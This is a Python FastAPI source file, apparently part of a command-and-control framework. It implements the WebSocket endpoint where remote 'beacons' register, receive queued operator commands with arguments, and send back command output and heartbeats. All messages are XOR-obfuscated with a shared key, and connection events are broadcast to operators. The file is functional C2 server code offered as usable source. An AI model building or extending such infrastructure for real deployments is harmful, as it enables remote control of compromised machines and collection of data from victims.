"""
AngelaMos | 2026
router.py

WebSocket endpoint that manages the full beacon connection lifecycle

The /ws/beacon handler validates the REGISTER handshake, then runs
two concurrent coroutines: one pushing queued tasks to the beacon and
one processing incoming RESULT and HEARTBEAT messages. On disconnect,
it cleans up the registry and queue and broadcasts the event to
operators.

Connects to:
  beacon/registry.py - registers, unregisters, updates heartbeat
  beacon/tasking.py - dequeues tasks, stores results
  config.py - reads XOR_KEY
  core/models.py - uses BeaconMeta, TaskResult
  core/protocol.py - calls pack, unpack
  database.py - calls get_db()
  ops/manager.py - broadcasts beacon events
"""

import asyncio
import logging
import uuid

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from app.beacon.registry import BeaconRegistry
from app.beacon.tasking import TaskManager
from app.config import settings
from app.core.models import BeaconMeta, TaskResult
from app.core.protocol import Message, MessageType, pack, unpack
from app.database import get_db


logger = logging.getLogger(__name__)

router = APIRouter()


async def _send_tasks(
    ws: WebSocket,
    beacon_id: str,
    task_manager: TaskManager,
) -> None:
    """
    Coroutine that awaits queued tasks and sends them to the beacon
    """
    while True:
        task = await task_manager.get_next(beacon_id)
        message = Message(
            type = MessageType.TASK,
            payload = {
                "id": task.id,
                "command": task.command,
                "args": task.args,
            },
        )
        await ws.send_text(pack(message, settings.XOR_KEY))


async def _receive_messages(
    ws: WebSocket,
    beacon_id: str,
    registry: BeaconRegistry,
    task_manager: TaskManager,
    ops_broadcast: object,
) -> None:
    """
    Coroutine that processes incoming messages from the beacon
    """
    while True:
        raw = await ws.receive_text()
        message = unpack(raw, settings.XOR_KEY)

        if message.type == MessageType.RESULT:
            result = TaskResult(
                id = str(uuid.uuid4()),
                task_id = message.payload["task_id"],
                output = message.payload.get("output"),
                error = message.payload.get("error"),
            )
            async with get_db() as db:
                await task_manager.store_result(result, db)

            if hasattr(ops_broadcast, "broadcast"):
                await ops_broadcast.broadcast(
                    {
                        "type": "task_result",
                        "payload": result.model_dump(),
                    }
                )

        elif message.type == MessageType.HEARTBEAT:
            async with get_db() as db:
                await registry.update_last_seen(beacon_id, db)

            if hasattr(ops_broadcast, "broadcast"):
                await ops_broadcast.broadcast(
                    {
                        "type": "heartbeat",
                        "payload": {
                            "id": beacon_id
                        },
                    }
                )


@router.websocket("/beacon")
async def beacon_websocket(ws: WebSocket) -> None:
    """
    WebSocket endpoint for beacon connections
    """
    await ws.accept()

    registry: BeaconRegistry = ws.app.state.registry
    task_manager: TaskManager = ws.app.state.task_manager
    ops_manager = ws.app.state.ops_manager
    beacon_id: str | None = None

    try:
        raw = await ws.receive_text()
        message = unpack(raw, settings.XOR_KEY)

        if message.type != MessageType.REGISTER:
            await ws.close(code = 4001, reason = "Expected REGISTER message")
            return

        meta = BeaconMeta.model_validate(message.payload)
        beacon_id = message.payload.get("id", str(uuid.uuid4()))

        async with get_db() as db:
            await registry.register(beacon_id, meta, ws, db)

        logger.info("Beacon registered: %s (%s)", beacon_id, meta.hostname)

        if hasattr(ops_manager, "broadcast"):
            beacon_record = meta.model_dump()
            beacon_record["id"] = beacon_id
            await ops_manager.broadcast(
                {
                    "type": "beacon_connected",
                    "payload": beacon_record,
                }
            )

        send_task = asyncio.create_task(_send_tasks(ws, beacon_id, task_manager))
        recv_task = asyncio.create_task(
            _receive_messages(ws,
                              beacon_id,
                              registry,
                              task_manager,
                              ops_manager)
        )

        done, pending = await asyncio.wait(
            [send_task, recv_task],
            return_when=asyncio.FIRST_COMPLETED,
        )

        for task in pending:
            task.cancel()

        for task in done:
            if (exc := task.exception()) is not None:
                raise exc

    except WebSocketDisconnect:
        logger.info("Beacon disconnected: %s", beacon_id)
    except ValueError as exc:
        logger.warning("Protocol error from beacon %s: %s", beacon_id, exc)
    finally:
        if beacon_id:
            async with get_db() as db:
                await registry.unregister(beacon_id, db)
            task_manager.remove_queue(beacon_id)

            if hasattr(ops_manager, "broadcast"):
                await ops_manager.broadcast(
                    {
                        "type": "beacon_disconnected",
                        "payload": {
                            "id": beacon_id
                        },
                    }
                )
